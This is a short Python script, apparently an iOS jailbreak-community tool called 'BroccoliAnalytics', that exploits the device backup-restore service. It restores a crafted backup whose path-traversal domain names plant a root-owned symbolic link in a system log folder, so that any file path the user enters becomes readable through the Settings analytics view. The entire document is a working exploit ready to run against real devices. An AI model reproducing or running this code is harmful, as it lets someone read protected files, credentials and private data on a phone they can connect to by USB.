from exploit import backup
from pymobiledevice3.lockdown import create_using_usbmux
from pymobiledevice3.services.mobilebackup2 import Mobilebackup2Service
from tempfile import TemporaryDirectory
from pathlib import Path

def create_haxxed_symlink(filename: str, target_fp: str):
    back = backup.Backup(files=[
        backup.Directory("", "SysContainerDomain-../../../../../../../../var/mobile/Library/Logs/RTCReporting/", owner=501, group=250),
        backup.SymbolicLink("", f"SysContainerDomain-../../../../../../../../var/mobile/Library/Logs/RTCReporting/BroccoliAnalytics-{filename}.txt", f"{target_fp}", owner=0, group=250)
    ])

    with TemporaryDirectory() as backup_dir:
        backup_dir_path = Path(backup_dir)
        back.write_to_directory(backup_dir_path)
        
        lockdown = create_using_usbmux()
        with Mobilebackup2Service(lockdown) as mb:
            mb.restore(backup_dir, system=True, reboot=False, copy=False, source=".")

print("""
        BroccoliAnalytics v1.1
  Written by the jailbreak.party team
    Exploit discovered by Duy Tran
""")
target = input("Enter the full path to the file you'd like to read: ")
filename = target.split('/')[-1]
create_haxxed_symlink(filename=filename, target_fp=target)
print(f"Success! (probably)\nYou should see a BrocoAnalytics-{filename}.txt file under Analytics Data in Settings.")
exit()
